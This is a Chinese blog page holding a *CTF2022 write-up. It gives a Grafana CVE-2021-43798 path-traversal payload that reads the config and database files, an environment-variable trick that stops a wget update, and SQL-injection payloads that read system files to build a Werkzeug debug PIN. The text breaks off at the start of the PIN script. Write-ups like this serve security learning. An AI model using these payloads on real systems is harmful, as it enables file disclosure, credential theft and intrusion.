@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>[*CTF2022] WP - Huamang&#39;s Blog</title><meta name="Description" content="Huamang&#39;s Blog"><meta property="og:title" content="[*CTF2022] WP" />
+<meta property="og:description" content="Web oh-my-grafana 存在CVE-2021-43798 paylaod 1 http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar/lib/grafana/grafana.db 有个加盐的密码 再找找其他配置文件，反正任意文件读取用起来 1 http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/grafana/grafana.ini 拿到了密码 1 2 3 4 5 # default admin user, created on startup admin_user =" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/ctf2022_wp/" /><meta property="og:image" content="https://example.com/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-04-17T18:29:06+08:00" />
+<meta property="article:modified_time" content="2022-04-17T18:29:06+08:00" /><meta property="og:site_name" content="Huamang&#39;s Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://example.com/logo.png"/>
+
+<meta name="twitter:title" content="[*CTF2022] WP"/>
+<meta name="twitter:description" content="Web oh-my-grafana 存在CVE-2021-43798 paylaod 1 http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar/lib/grafana/grafana.db 有个加盐的密码 再找找其他配置文件，反正任意文件读取用起来 1 http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/grafana/grafana.ini 拿到了密码 1 2 3 4 5 # default admin user, created on startup admin_user ="/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://example.com/ctf2022_wp/" /><link rel="prev" href="https://example.com/java%E5%AE%89%E5%85%A8_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/" /><link rel="next" href="https://example.com/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[*CTF2022] WP",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/example.com\/ctf2022_wp\/"
+        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  1104 ,
+        "url": "https:\/\/example.com\/ctf2022_wp\/","datePublished": "2022-04-17T18:29:06+08:00","dateModified": "2022-04-17T18:29:06+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/example.com\/images\/avatar.png",
+                    "width":  320 ,
+                    "height":  320 
+                }},"author": {
+                "@type": "Person",
+                "name": "Huamang"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw" aria-hidden="true"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/ctf2022_wp/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/ctf2022_wp/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[*CTF2022] WP</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Huamang</a>
+</span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-04-17">2022-04-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 1104 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#web">Web</a>
+          <ul>
+            <li><a href="#oh-my-grafana">oh-my-grafana</a></li>
+            <li><a href="#oh-my-lotto">oh-my-lotto</a></li>
+            <li><a href="#oh-my-note">oh-my-note</a></li>
+          </ul>
+        </li>
+        <li><a href="#misc">Misc</a>
+          <ul>
+            <li><a href="#today">today</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="web">Web</h2>
+<h3 id="oh-my-grafana">oh-my-grafana</h3>
+<p>存在CVE-2021-43798
+paylaod</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="nl">http:</span><span class="c1">//124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar/lib/grafana/grafana.db
+</span></code></pre></td></tr></table>
+</div>
+</div><p>有个加盐的密码
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/295f01dea01f4e52ab3ac68069f4bc8e.png"
+        data-srcset="https://img-blog.csdnimg.cn/295f01dea01f4e52ab3ac68069f4bc8e.png, https://img-blog.csdnimg.cn/295f01dea01f4e52ab3ac68069f4bc8e.png 1.5x, https://img-blog.csdnimg.cn/295f01dea01f4e52ab3ac68069f4bc8e.png 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/295f01dea01f4e52ab3ac68069f4bc8e.png"
+        title="在这里插入图片描述" />
+再找找其他配置文件，反正任意文件读取用起来
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/930291c6c4c741f381ba3e26a0195fc8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/930291c6c4c741f381ba3e26a0195fc8.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/930291c6c4c741f381ba3e26a0195fc8.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/930291c6c4c741f381ba3e26a0195fc8.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/930291c6c4c741f381ba3e26a0195fc8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="nl">http:</span><span class="c1">//124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/grafana/grafana.ini
+</span></code></pre></td></tr></table>
+</div>
+</div><p>拿到了密码
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/82b8c21184204682afe468669ca0a9a7.png"
+        data-srcset="https://img-blog.csdnimg.cn/82b8c21184204682afe468669ca0a9a7.png, https://img-blog.csdnimg.cn/82b8c21184204682afe468669ca0a9a7.png 1.5x, https://img-blog.csdnimg.cn/82b8c21184204682afe468669ca0a9a7.png 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/82b8c21184204682afe468669ca0a9a7.png"
+        title="在这里插入图片描述" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="err">#</span> <span class="k">default</span> <span class="n">admin</span> <span class="n">user</span><span class="o">,</span> <span class="n">created</span> <span class="n">on</span> <span class="n">startup</span>
+<span class="n">admin_user</span> <span class="o">=</span> <span class="n">admin</span>
+
+<span class="err">#</span> <span class="k">default</span> <span class="n">admin</span> <span class="n">password</span><span class="o">,</span> <span class="n">can</span> <span class="n">be</span> <span class="n">changed</span> <span class="n">before</span> <span class="n">first</span> <span class="n">start</span> <span class="n">of</span> <span class="n">grafana</span><span class="o">,</span>  <span class="n">or</span> <span class="n">in</span> <span class="n">profile</span> <span class="n">settings</span>
+<span class="n">admin_password</span> <span class="o">=</span> <span class="n">5f989714e132c9b04d4807dafeb10ade</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>进去后可以执行sql语句
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/c9aa0cb6d46440f3930cc9f713b35c93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_14,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/c9aa0cb6d46440f3930cc9f713b35c93.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_14%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/c9aa0cb6d46440f3930cc9f713b35c93.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_14%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/c9aa0cb6d46440f3930cc9f713b35c93.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_14%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/c9aa0cb6d46440f3930cc9f713b35c93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_14,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+<p>查一下表名
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/edf641577d5f4bdbb4bf7ff11551eab3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/edf641577d5f4bdbb4bf7ff11551eab3.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/edf641577d5f4bdbb4bf7ff11551eab3.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/edf641577d5f4bdbb4bf7ff11551eab3.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/edf641577d5f4bdbb4bf7ff11551eab3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" />
+拿flag
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/8bee48f8e4964062b4781cacb03a8aeb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/8bee48f8e4964062b4781cacb03a8aeb.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/8bee48f8e4964062b4781cacb03a8aeb.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/8bee48f8e4964062b4781cacb03a8aeb.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/8bee48f8e4964062b4781cacb03a8aeb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+<h3 id="oh-my-lotto">oh-my-lotto</h3>
+<p>主要思路就是：</p>
+<p>首先是随便摸一个奖，然后在result路由里面获得了结果，是上一轮的</p>
+<p>正常情况下，你再次去摸奖，他会wget不改变名字的去下载乐透结果，也就等同于更新一次乐透结果，也就是这个代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;wget --content-disposition -N lotto&#39;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>但是在此之前，有这么一句代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">lotto_key</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;lotto_key&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="s1">&#39;&#39;</span>
+<span class="n">lotto_value</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;lotto_value&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="s1">&#39;&#39;</span>
+
+<span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="n">lotto_key</span><span class="p">]</span> <span class="o">=</span> <span class="n">lotto_value</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里我们可以操作lotto_key和lotto_value</p>
+<p>那么就可以把path改掉，让他执行不了wget命令，这样的话，/app/lotto_result.txt就和上一局是一样的</p>
+<p>这样的话，我们再把上一次的乐透结果传上去，这样就能判断相等，获取flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s2">&#34;/app/guess/forecast.txt&#34;</span><span class="p">):</span>
+    <span class="n">forecast</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/app/guess/forecast.txt&#34;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">forecast</span> <span class="o">==</span> <span class="n">lotto_result</span><span class="p">:</span>
+    <span class="k">return</span> <span class="n">flag</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>然后访问lotto路由拿到flag</p>
+<p>注意有个坑，乐透结果之间是换行，所以文件构造的也应该是换行
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/68792c8d3ae1435bbac4e1b5f4258e0e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/68792c8d3ae1435bbac4e1b5f4258e0e.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/68792c8d3ae1435bbac4e1b5f4258e0e.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/68792c8d3ae1435bbac4e1b5f4258e0e.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/68792c8d3ae1435bbac4e1b5f4258e0e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" /></p>
+<h3 id="oh-my-note">oh-my-note</h3>
+<p>admin:admin进入后台
+在view note处存在sql注入，基本没有过滤，<strong>而且开启了debug</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="nl">http:</span><span class="c1">//124.70.185.87:5002/view?note_id=pt8q0tub5k59zh9b4hc5te6kdc6vjyn3%27
+</span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img-blog.csdnimg.cn/b9069b7a99aa4ada802de544131fa299.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        data-srcset="https://img-blog.csdnimg.cn/b9069b7a99aa4ada802de544131fa299.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16, https://img-blog.csdnimg.cn/b9069b7a99aa4ada802de544131fa299.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 1.5x, https://img-blog.csdnimg.cn/b9069b7a99aa4ada802de544131fa299.png?x-oss-process=image/watermark%2ctype_d3F5LXplbmhlaQ%2cshadow_50%2ctext_Q1NETiBAaHVhbWFuZ2dn%2csize_20%2ccolor_FFFFFF%2ct_70%2cg_se%2cx_16 2x"
+        data-sizes="auto"
+        alt="https://img-blog.csdnimg.cn/b9069b7a99aa4ada802de544131fa299.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+        title="在这里插入图片描述" />
+开了debug，需要构造pin码，利用sql注入进行文件读取
+payload如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="err">&#39;</span><span class="o">;</span><span class="n">create</span> <span class="n">table</span> <span class="nf">fxz1</span><span class="o">(</span><span class="n">data</span> <span class="n">text</span><span class="o">);</span><span class="err">#</span>
+<span class="n">读取mac地址</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">class</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">eth0</span><span class="o">/</span><span class="n">address</span><span class="err">、</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">machine</span><span class="o">-</span><span class="n">id</span><span class="err">、</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">cgroup</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>load data 写入创建的表
+/etc/machine-id一般固定
+1cc402dd0e11d5ae18db04a6de87223d</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="err">&#39;</span><span class="o">;</span><span class="n">LOAD</span> <span class="n">DATA</span> <span class="n">LOCAL</span> <span class="n">INFILE</span> <span class="s">&#34;/sys/class/net/eth0/address&#34;</span> <span class="n">INTO</span> <span class="n">TABLE</span> <span class="n">fxz1</span><span class="o">;</span><span class="err">#</span>
+<span class="err">&#39;</span><span class="o">;</span><span class="n">LOAD</span> <span class="n">DATA</span> <span class="n">LOCAL</span> <span class="n">INFILE</span> <span class="s">&#34;/proc/self/cgroup&#34;</span> <span class="n">INTO</span> <span class="n">TABLE</span> <span class="n">fxz2</span><span class="o">;</span><span class="err">#</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>查看结果</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="err">&#39;</span> <span class="n">union</span> <span class="n">select</span> <span class="n">1</span><span class="o">,</span><span class="n">2</span><span class="o">,</span><span class="n">3</span><span class="o">,</span><span class="n">4</span><span class="o">,(</span><span class="n">select</span><span class="o">(</span><span class="n">group_concat</span><span class="o">(</span><span class="n">data</span><span class="o">))</span><span class="n">from</span><span class="o">(</span><span class="n">fxz1</span><span class="o">))</span><span class="err">#</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>构造pin生成脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
